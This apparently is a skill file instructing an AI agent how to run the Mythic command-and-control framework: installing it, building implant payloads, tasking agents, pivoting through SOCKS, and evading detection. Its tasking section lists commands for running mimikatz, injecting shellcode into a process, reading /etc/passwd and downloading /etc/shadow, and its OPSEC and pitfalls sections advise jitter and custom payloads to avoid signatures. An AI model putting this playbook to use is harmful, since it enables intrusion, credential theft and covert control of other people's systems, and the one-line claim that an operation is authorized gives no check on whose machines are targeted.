---
name: mythic-c2
description: "Mythic C2 framework: agent deployment, payload types, tasking, and operational workflows. Use this skill when running an authorized operation with Mythic."
---

# Mythic C2

## Overview

Mythic is an open-source C2 with a web UI, pluggable agents (Apollo, Poseidon, Atlas), and C2 profiles (HTTP, WebSocket, dynamic).

## Setup

```bash
git clone https://github.com/its-a-feature/Mythic
cd Mythic && sudo ./mythic-cli start
# web UI at https://127.0.0.1:7443
```

Install agents and profiles:

```bash
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
```

## Payload creation

1. Create a C2 profile instance (HTTP with a callback host).
2. Create a payload: agent type (Apollo for Windows), C2 profile, command blocks.
3. Download the payload.

```bash
# build via CLI
sudo ./mythic-cli payload create -f payload_config.json
```

## Tasking

Apollo (Windows):

```
shell whoami
ps
ls
download C:\file
upload /local C:\remote
execute-assembly /path/tool.exe args
inject 1234 /path/shellcode.bin
mimikatz
ldap_query
```

Poseidon (Linux/macOS):

```
shell id
ps
ls
cat /etc/passwd
download /etc/shadow
```

## Pivoting

Mythic supports SOCKS proxies per callback:

```
socks 1080
```
Then `proxychains` through the operator host.

## OPSEC

- Set callback intervals and jitter.
- Use profiles matching the environment.
- Rotate payload types between hosts.

## Pitfalls

- Default Mythic payloads are signatured; build custom ones.
- The web UI needs a valid TLS cert for realistic operations.
- Agent capabilities differ — check what the agent supports before tasking.

## Verification

Task output must come back through the callback, confirming execution on the target.
